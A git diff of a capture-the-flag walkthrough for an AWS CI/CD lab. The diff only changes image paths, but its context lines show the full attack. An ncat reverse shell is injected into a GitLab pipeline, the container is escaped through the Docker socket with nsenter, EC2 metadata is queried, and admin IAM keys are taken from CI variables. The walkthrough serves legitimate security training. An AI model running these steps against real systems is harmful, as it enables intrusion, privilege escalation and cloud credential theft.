@@ -125,7 +125,7 @@ The following is a step by step walkthrough of the CTF. You can refer to this if
 
     After this, it will ask for a player name. Please only use lower and uppercase letters. No special characters or numbers.
 
-    ![Consent Message](/images/aws/capture_the_flag/cicdont/consent.png)
+    ![Consent Message](../../images/aws/capture_the_flag/cicdont/consent.png)
 
     After this, you will be asked if you'd like to perform the deployment. Answer with "yes".
 
@@ -136,7 +136,7 @@ The following is a step by step walkthrough of the CTF. You can refer to this if
     !!! Note
         You will now need to wait 10 minutes for the deployment to finish. The 10 minute timer starts **AFTER** you get the "Apply complete" notification.
 
-    ![Output](/images/aws/capture_the_flag/cicdont/output.png)
+    ![Output](../../images/aws/capture_the_flag/cicdont/output.png)
 
     Does it really take 10 minutes? Yes, it takes a little bit to get everything setup. You can take this time to get familiar with your attackbox. This is an EC2 instance you can use for whatever you need during the CTF, particularly to catch shells.
 
@@ -153,17 +153,17 @@ The following is a step by step walkthrough of the CTF. You can refer to this if
 
     After waiting those 10 minutes, you finally have a target. You can navigate to the target_ip to see a GitLab instance. Log in using your player username and password.
 
-    ![Login Page](/images/aws/capture_the_flag/cicdont/login.png)
+    ![Login Page](../../images/aws/capture_the_flag/cicdont/login.png)
 
     From here, you can navigate around, explore the various projects, and more. You might even notice a little notification in the upper right hand corner.
 
-    ![ToDo](/images/aws/capture_the_flag/cicdont/todo.png)
+    ![ToDo](../../images/aws/capture_the_flag/cicdont/todo.png)
 
     Ashley has some work for us! Perhaps this will give us a hint for something we can exploit.
 
     Navigate to the mvp-docker project's Issues page.
 
-    ![Issue](/images/aws/capture_the_flag/cicdont/issue.png)
+    ![Issue](../../images/aws/capture_the_flag/cicdont/issue.png)
 
     This is interesting for a few reasons. Most notably, Ashley wants some help with building a Docker container as a part of the CI/CD pipeline. She also mentions a [gitlab-ci.yml](https://docs.gitlab.com/ee/ci/yaml/gitlab_ci_yaml.html) file, which is the configuration for the [GitLab CI/CD](https://docs.gitlab.com/ee/ci/) pipeline.
 
@@ -171,13 +171,13 @@ The following is a step by step walkthrough of the CTF. You can refer to this if
 
     Before we can get to that fun, let's take a look at that gitlab-ci.yml file. Navigate there and make some changes (you can edit the file through the web browser if you prefer or you can clone the project locally).
 
-    ![Config](/images/aws/capture_the_flag/cicdont/config.png)
+    ![Config](../../images/aws/capture_the_flag/cicdont/config.png)
 
     After committing changes (via the web interface or otherwise) you can navigate to the `CI/CD` tab on the left to see the pipeline execute.
 
     Clicking on the status, and then the build job we can see the output.
 
-    ![Pipeline Output](/images/aws/capture_the_flag/cicdont/buildoutput.png)
+    ![Pipeline Output](../../images/aws/capture_the_flag/cicdont/buildoutput.png)
 
     This can tell us a few things that are very useful to us as attackers. First, on line 3, we see that the CI/CD pipeline is using the "docker" executor, meaning everything executes inside a Docker container somewhere. On line 6, we see that it is using an Ubuntu Docker image. And lines 20+ show us that our input is executing in this environment.
 
@@ -191,7 +191,7 @@ The following is a step by step walkthrough of the CTF. You can refer to this if
 
     SSH into your attack box and install a tool called `ncat`.
 
-    ![ncat install](/images/aws/capture_the_flag/cicdont/ncat.png)
+    ![ncat install](../../images/aws/capture_the_flag/cicdont/ncat.png)
 
     Now, we can setup a listener (from the attackbox) with the following command.
 
@@ -207,13 +207,13 @@ The following is a step by step walkthrough of the CTF. You can refer to this if
     ncat <attackbox_ip> 443 --ssl -e /bin/bash -v
     ```
 
-    ![Second Pipeline](/images/aws/capture_the_flag/cicdont/newbuild.png)
+    ![Second Pipeline](../../images/aws/capture_the_flag/cicdont/newbuild.png)
 
     Now click "Commit changes" and watch that pipeline run.
 
     You are now the proud owner of a reverse shell inside this Docker container.
 
-    ![Shell](/images/aws/capture_the_flag/cicdont/shell.png)
+    ![Shell](../../images/aws/capture_the_flag/cicdont/shell.png)
 
     **Docker Socket**
 
@@ -233,7 +233,7 @@ The following is a step by step walkthrough of the CTF. You can refer to this if
 
     The common location for the socket is at `/var/run/docker.sock`, let's go look for it.
 
-    ![Finding the Docker Socket](/images/aws/capture_the_flag/cicdont/socket.png)
+    ![Finding the Docker Socket](../../images/aws/capture_the_flag/cicdont/socket.png)
 
     There we go! They did mount the Docker socket! Let's use this to escape the container.
 
@@ -257,7 +257,7 @@ The following is a step by step walkthrough of the CTF. You can refer to this if
     python3 -c "import pty;pty.spawn('/bin/bash')"
     ```
 
-    ![Creating a TTY](/images/aws/capture_the_flag/cicdont/view.png)
+    ![Creating a TTY](../../images/aws/capture_the_flag/cicdont/view.png)
 
     Doesn't that looks so much better? We have an actual shell prompt now. This will be useful for interacting with the Docker socket. Speaking of which, let's see which Docker containers are running on the host.
 
@@ -277,7 +277,7 @@ The following is a step by step walkthrough of the CTF. You can refer to this if
     nsenter --target 1 --mount --uts --ipc --net --pid -- bash
     ```
 
-    ![Escalating to Root](/images/aws/capture_the_flag/cicdont/rootonbox.png)
+    ![Escalating to Root](../../images/aws/capture_the_flag/cicdont/rootonbox.png)
 
     How fun is that?! We now have root on the underlying host and have escaped the container.
 
@@ -294,7 +294,7 @@ The following is a step by step walkthrough of the CTF. You can refer to this if
     curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/user-data/
     ```
 
-    ![Showing User Data](/images/aws/capture_the_flag/cicdont/userdata.png)
+    ![Showing User Data](../../images/aws/capture_the_flag/cicdont/userdata.png)
 
     On first glance it appears pretty standard; It installs GitLab, installs the GitLab runners, activates them, etc.
 
@@ -304,11 +304,11 @@ The following is a step by step walkthrough of the CTF. You can refer to this if
 
     After exploring around for a little while, you may stumble into the the `infra-deployer` project. That sounds important.
 
-    ![The infra-deployer Project](/images/aws/capture_the_flag/cicdont/deployer.png)
+    ![The infra-deployer Project](../../images/aws/capture_the_flag/cicdont/deployer.png)
 
     "Admin IAM Credentials are being stored in environment variables to be used with the GitLab runners". That sounds.....very interesting. The good news is that as an administrator, we can see those variables. Navigate to the `Settings` tab on the left and then click `CI/CD`. Next, click `Expand` on the `Variables` section.
 
-    ![Showing the Environment Variables](/images/aws/capture_the_flag/cicdont/variables.png)
+    ![Showing the Environment Variables](../../images/aws/capture_the_flag/cicdont/variables.png)
 
     An Access Key and a Secret Access Key! Let's see who they belong to (you can also do this [without logging to CloudTrail](https://hackingthe.cloud/aws/enumeration/whoami/) if you were so inclined).
 
@@ -318,7 +318,7 @@ The following is a step by step walkthrough of the CTF. You can refer to this if
     aws sts get-caller-identity
     ```
 
-    ![Whoami](/images/aws/capture_the_flag/cicdont/identity.png)
+    ![Whoami](../../images/aws/capture_the_flag/cicdont/identity.png)
 
     And with that we have achieved our objective! Congratulations on completing the CTF. Want to provide some feedback? Feel free to open a discussion on [GitHub](https://github.com/Hacking-the-Cloud/hackingthe.cloud/discussions/categories/ctf-discussion).
 
